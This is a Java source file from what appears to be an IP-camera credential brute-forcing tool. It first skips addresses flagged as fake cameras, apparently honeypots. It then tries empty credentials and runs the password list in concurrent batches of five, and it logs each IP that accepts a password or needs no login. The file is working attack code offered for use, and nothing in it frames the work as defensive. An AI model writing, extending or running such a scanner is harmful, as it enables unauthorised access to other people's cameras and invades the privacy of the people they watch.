package scanner.brute;

import lombok.SneakyThrows;
import lombok.extern.slf4j.Slf4j;

import java.util.HashSet;
import java.util.List;
import java.util.concurrent.*;

@Slf4j
public class BruteForceScanner {

    private final ExecutorService executorService = Executors.newFixedThreadPool(20);

    @SneakyThrows
    public void brute(String ip, String[] passwords) {
        AuthStateStore auth = new AuthStateStore();

        if (IpBruteFilter.excludeFakeCamera(ip))
            return;

        HashSet<BruteForceExecutor> requests = new HashSet<>();

        BruteForceExecutor bruteForceExecutor = new BruteForceExecutor(ip, null);
        AuthState stateForEmptyCredentials = bruteForceExecutor.call().getState();

        for (int i = 0; i < passwords.length; i++) {
            if (stateForEmptyCredentials == AuthState.AUTH) {
                auth.setState(stateForEmptyCredentials);
                break;
            }

            if (auth.getState() == AuthState.NOT_AVAILABLE)
                break;

            requests.add(new BruteForceExecutor(ip, passwords[i]));
            if (requests.size() == 5 || i == passwords.length - 1) {
                List<Future<AuthStateStore>> futures = executorService.invokeAll(requests, 2L, TimeUnit.SECONDS);
                for (Future<AuthStateStore> future : futures) {
                    try {
                        AuthStateStore authNew = future.get(1L, TimeUnit.SECONDS);
                        if (authNew.isAuth() && !auth.isAuth()) {
                            auth.setCredentials(authNew.getCredentials());
                            auth.setState(authNew.getState());
                        }
                    } catch (CancellationException | ExecutionException | InterruptedException ce) {
                        auth.setState(AuthState.NOT_AVAILABLE);
                        future.cancel(true);
                    }
                }
                requests.clear();
            }
        }
        switch (auth.getState()) {
            case AUTH:
            case NOT_REQUIRED:  log.info("{} => {}", ip, auth.getCredentials().orElse("Auth not required")); break;
            case UNKNOWN_STATE: // maybe basic request must be changed manually
            case NOT_AVAILABLE: log.debug("{} => skipped, not available", ip); // maybe it will be deleted as "bad cameras"
            case NOT_AUTH:
            default: break;
        }
    }

}